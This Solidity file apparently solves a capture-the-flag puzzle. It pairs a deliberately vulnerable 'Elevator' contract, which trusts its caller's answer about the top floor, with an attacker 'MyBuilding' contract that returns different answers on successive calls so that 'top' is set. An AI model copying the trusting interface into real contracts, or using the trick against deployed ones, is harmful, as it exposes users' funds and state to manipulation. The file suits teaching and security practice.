// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract MyBuilding {
  bool public firstTime = true;
  Elevator public ctr;

  constructor(Elevator _ctr) {
    ctr = _ctr;
  }

  function isLastFloor(uint) external returns (bool) {
    if (firstTime) {
      firstTime = false;

      return false;
    }

    return true;
  }

  function goTo(uint _floor) public {
    ctr.goTo(_floor);
  }
}
